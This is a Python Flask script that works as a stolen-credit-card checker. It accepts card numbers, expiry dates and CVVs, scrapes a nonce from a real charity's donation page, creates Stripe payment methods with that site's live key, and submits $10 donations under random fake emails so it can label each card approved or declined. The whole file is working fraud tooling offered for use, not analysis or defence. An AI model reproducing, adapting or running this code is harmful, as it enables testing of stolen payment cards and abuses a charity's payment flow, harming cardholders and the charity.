#!/usr/bin/env python3
from flask import Flask, request, jsonify
import re
import random
import string
import requests
import datetime
import time
import json
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Your API key
API_KEY = "darkwaslost"

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'

def format_response(cc, mm, yy, cvv, status, message, time_taken):
    """Format the card response"""
    status_text = "Approved ✅" if status == "APPROVED" else "Declined ❌"
    result_text = "Order Placed 🔥" if status == "APPROVED" else "Declined 🚫"
    
    return {
        "cc": f"{cc}|{mm}|{yy}|{cvv}",
        "status": status_text,
        "response": message,
        "result": result_text,
        "time": time_taken,
        "gateway": "Site Based 1$"
    }

def extract_card_details(card_input):
    """Extract card details from input string"""
    card_match = re.search(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_input)
    if card_match:
        cc = card_match.group(1)
        mm = card_match.group(2)
        yy = card_match.group(3)
        cvv = card_match.group(4)
        return cc, mm, yy, cvv
    return None, None, None, None

def check_card_expiration(mm, yy):
    """Check if card is expired"""
    current_year = datetime.datetime.now().year
    current_month = datetime.datetime.now().month
    
    try:
        exp_year = int(yy)
        exp_month = int(mm)
        
        if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
            return True
    except:
        pass
    return False

@app.route('/gate=s10/key=<key>/cc=<cc_details>')
def check_cc(key, cc_details):
    if key != API_KEY:
        return jsonify({"error": "Invalid API key"}), 403
    
    cc, mm, yy, cvv = extract_card_details(cc_details)
    if not cc or not mm or not yy or not cvv:
        return jsonify({"error": "Invalid CC format. Use CC|MM|YY|CVV or CC|MM|YYYY|CVV"}), 400
    
    # Convert 2-digit year to 4-digit if needed
    if len(yy) == 2:
        current_century = datetime.datetime.now().year // 100 * 100
        yy_full = str(current_century + int(yy))
    else:
        yy_full = yy
    
    start_time = datetime.datetime.now()
    
    # Check card expiration first
    if check_card_expiration(mm, yy_full):
        end_time = datetime.datetime.now()
        time_taken = str(end_time - start_time).split('.')[0]
        return jsonify(format_response(
            cc, mm, yy, cvv,
            "DECLINED",
            "Card expired",
            time_taken
        ))
    
    try:
        # Step 1: Get nonce
        user_agent = generate_user_agent()
        email = generate_random_account()
        session = requests.Session()
        
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        }
        
        response = session.get(
            'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            headers=headers
        )
        nonce = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', response.text)
        nonce = nonce.group(1) if nonce else None
        
        if not nonce:
            raise Exception("Payment gateway error (nonce not found)")
        
        # Step 2: Create payment method
        headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com'
        }
        
        data = {
            'type': 'card',
            'billing_details[name]': 'Test User',
            'billing_details[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy_full,
            'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
        }
        
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data
        )
        
        if response.status_code != 200:
            error = response.json().get('error', {}).get('message', 'Unknown error')
            raise Exception(f"Payment declined: {error}")
        
        payment_method = response.json().get('id')
        if not payment_method:
            raise Exception("Payment method creation failed")
        
        # Step 3: Make donation
        headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://needhelped.com',
            'Referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'
        }
        
        data = {
            '_charitable_donation_nonce': nonce,
            'campaign_id': '1164',
            'description': 'Donation',
            'donation_amount': 'custom',
            'custom_donation_amount': '10.00',
            'first_name': 'Test',
            'last_name': 'User',
            'email': email,
            'gateway': 'stripe',
            'stripe_payment_method': payment_method,
            'action': 'make_donation'
        }
        
        response = session.post(
            'https://needhelped.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data
        )
        
        result = response.json()
        end_time = datetime.datetime.now()
        time_taken = str(end_time - start_time).split('.')[0]
        
        if result.get('requires_action') and result.get('success'):
            response_data = format_response(
                cc, mm, yy, cvv,
                "APPROVED",
                "Payment successful",
                time_taken
            )
        else:
            error = result.get('errors', 'Transaction failed')
            response_data = format_response(
                cc, mm, yy, cvv,
                "DECLINED",
                str(error),
                time_taken
            )
        
        # Print to terminal
        terminal_output = (
            f"cc={cc}|{mm}|{yy}|{cvv}, "
            f"status={'APPROVED' if response_data['status'] == 'Approved ✅' else 'DECLINED'}, "
            f"response={response_data['response']}"
        )
        print(terminal_output)
        
        return jsonify(response_data)
        
    except Exception as e:
        end_time = datetime.datetime.now()
        time_taken = str(end_time - start_time).split('.')[0]
        
        error_data = format_response(
            cc, mm, yy, cvv,
            "DECLINED",
            str(e),
            time_taken
        )
        
        # Print to terminal
        print(f"cc={cc}|{mm}|{yy}|{cvv}, status=ERROR, response={str(e)}")
        
        return jsonify(error_data)

if __name__ == '__main__':
    # Run on port 5001 (different from the previous example)
    app.run(host='0.0.0.0', port=1020)
